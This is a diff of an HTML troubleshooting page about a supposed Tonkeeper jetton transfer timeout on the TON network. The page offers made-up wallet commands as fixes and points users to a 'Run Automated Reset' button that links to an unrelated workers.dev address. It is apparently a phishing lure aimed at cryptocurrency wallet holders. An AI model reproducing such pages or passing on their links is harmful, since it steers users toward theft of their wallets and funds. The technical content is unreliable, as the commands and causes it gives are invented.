@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and potential loss of funds.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and potential losses.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper's jetton transfer loop, which is likely caused by network congestion, high gas fees, or incorrect configuration of the transfer parameters.</li>
+<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, incorrect configuration, or issues with the Tonkeeper wallet.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to accommodate for the increased network load: </li>
-<li>Increase the <code>--gas</code> parameter when initiating the transfer</li>
-<li>Adjust the <code>--gas-price</code> to a higher value to prioritize the transaction</li>
-<li>Use the following code to override the default transfer settings:</li>
+<li>To resolve the issue, try the following:</li>
+<li>Check the TON network status for any ongoing maintenance or issues</li>
+<li>Verify that the Tonkeeper wallet is updated to the latest version</li>
+<li>Use the following command to reset the transfer loop:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>override_transfer_config<span class="w"> </span><span class="s1">&#39;{&quot;gas&quot;: 100000, &quot;gas_price&quot;: 1000000000}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>Wallet.abi.json
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>resetTransferLoop<span class="w"> </span><span class="o">{}</span><span class="w"> </span>--abi<span class="w"> </span>TonkeeperWallet.abi
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
+<p>Consider utilizing a dedicated console for troubleshooting to avoid any potential conflicts with your primary environment. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with the TON command-line interface (CLI)</li>
-<li>Access to the <code>tonos-cli</code> tool</li>
-<li>Understanding of the Tonkeeper wallet configuration and settings</li>
+<li>TON ecosystem account</li>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Basic understanding of TON network and Tonkeeper functionality</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
